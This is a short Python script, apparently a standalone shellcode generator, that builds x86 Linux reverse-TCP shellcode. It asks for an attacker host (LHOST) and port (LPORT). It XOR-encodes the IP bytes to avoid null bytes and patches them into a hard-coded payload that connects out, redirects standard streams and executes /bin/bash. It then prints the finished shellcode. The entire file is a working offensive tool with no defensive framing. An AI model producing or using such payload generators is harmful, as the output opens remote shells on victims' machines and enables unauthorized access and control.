#!/usr/bin/python3

import socket
import struct
import sys
import time


def linux_reverse_tcp():
    shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'
    shellcode += '\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01'
    shellcode += '\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7'
    shellcode += '\\xb8\\x80\\xff\\xff\\xfe\\xbb\\xff\\xff'
    shellcode += '\\xff\\xff\\x31\\xd8\\x52\\x52\\x50\\x66'
    shellcode += '\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6'
    shellcode += '\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x03'
    shellcode += '\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80'
    shellcode += '\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f'
    shellcode += '\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0'
    shellcode += '\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e'
    shellcode += '\\x2f\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88'
    shellcode += '\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31'
    shellcode += '\\xc9\\x31\\xd2\\xcd\\x80'
    ip = input("Enter a LHOST : ")
    port = input("Enter a LPORT : ")
    port_htons = hex(socket.htons(int(port)))
    
    byte1 = port_htons[4:]
    if byte1 == '':
        byte1 = '0'
    byte2 = port_htons[2:4]
    ip_bytes = []
    xor_bytes = []
    ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-2:])
    ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-4:-2])
    ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-6:-4])
    ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][:-6])
    for b in range(0, 4):
        for k in range(1, 255):
                if int(ip_bytes[b], 16) ^ k != 0: # Make sure there is no null byte
                        ip_bytes[b] = hex(int(ip_bytes[b], 16) ^ k)[2:]
                        xor_bytes.append(hex(k)[2:])
                        break
    shellcode = shellcode.replace('\\x11\\x5c', '\\x{}\\x{}'.format(byte1, byte2))
    shellcode = shellcode.replace('\\x80\\xff\\xff\\xfe', '\\x{}\\x{}\\x{}\\x{}'.format(ip_bytes[3], ip_bytes[2], ip_bytes[1], ip_bytes[0]))
    shellcode = shellcode.replace('\\xff\\xff\\xff\\xff', '\\x{}\\x{}\\x{}\\x{}'.format(xor_bytes[3], xor_bytes[2], xor_bytes[1], xor_bytes[0]))
    print("[\033[91m+\033[00m] generation du shellcode pour \033[92mlinux/reverse_tcp_elf32\033[00m")
    time.sleep(3)
    print('\033[91mShellcode elf32 for Linux :\033[00m')
    print(shellcode)
